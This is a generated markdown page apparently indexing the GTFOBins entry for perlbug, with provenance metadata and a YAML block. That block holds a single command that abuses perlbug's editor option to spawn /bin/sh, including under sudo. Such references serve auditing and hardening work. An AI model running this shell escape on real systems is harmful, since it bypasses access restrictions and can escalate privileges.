---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# perlbug

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `perlbug` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perlbug` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [perlbug](../../tools/linux/perlbug.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | perlbug |
| name | perlbug |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/perlbug/ |

## Preserved Source Material

```yaml
_body: ''
_name: perlbug
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perlbug
functions:
  shell:
  - code: 'perlbug -s ''x x x'' -r x -c x -e ''exec /bin/sh #'''
    comment: This requires to press `Enter` serveral times before the shell is spawn.
    contexts:
      sudo: null
      unprivileged: null
```
